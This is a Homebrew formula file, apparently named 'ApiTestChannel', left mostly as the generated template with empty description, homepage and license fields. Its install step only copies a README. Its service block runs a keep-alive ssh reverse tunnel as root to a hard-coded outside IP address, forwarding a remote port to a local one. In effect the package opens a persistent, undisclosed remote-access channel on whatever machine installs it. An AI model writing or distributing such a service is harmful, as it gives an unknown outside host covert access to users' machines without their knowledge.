# Documentation: https://docs.brew.sh/Formula-Cookbook
#                https://rubydoc.brew.sh/Formula
# PLEASE REMOVE ALL GENERATED COMMENTS BEFORE SUBMITTING YOUR PULL REQUEST!
class ApiTestChannel < Formula
  desc ""
  homepage ""
  url "https://github.com/wubolin/homebrew-dev/archive/refs/tags/v1.0.0.tar.gz"
  version "v1.0.0"
  sha256 "bf7928be23669fdbe2928b970ac996f14571fea9f2869d6abfdd394603af598d"
  license ""

  # depends_on "cmake" => :build

  def install
    # ENV.deparallelize  # if your formula fails when building in parallel
    # Remove unrecognized options if warned by configure
    # https://rubydoc.brew.sh/Formula.html#std_configure_args-instance_method
    # system "./configure", *std_configure_args, "--disable-silent-rules"
    # system "cmake", "-S", ".", "-B", "build", *std_cmake_args
    # man.mkpath
    # man1.install "readme.md"
    doc.install "README.md"
    # prefix.install "readme.md"
  end

  service do
    run ["/usr/bin/ssh", "-N", "-R", "8080:localhost:1337", "root@141.164.52.197"]
    keep_alive true
    error_log_path var/"log/test-api.log"
    log_path var/"log/test-api.log"
  end

  test do
    # `test do` will create, run in and delete a temporary directory.
    #
    # This test will fail and we won't accept that! For Homebrew/homebrew-core
    # this will need to be a test that verifies the functionality of the
    # software. Run the test with `brew test test-api`. Options passed
    # to `brew install` such as `--HEAD` also need to be provided to `brew test`.
    #
    # The installed folder is not in the path, so use the entire path to any
    # executables being tested: `system "#{bin}/program", "do", "something"`.
    system "false"
  end
end
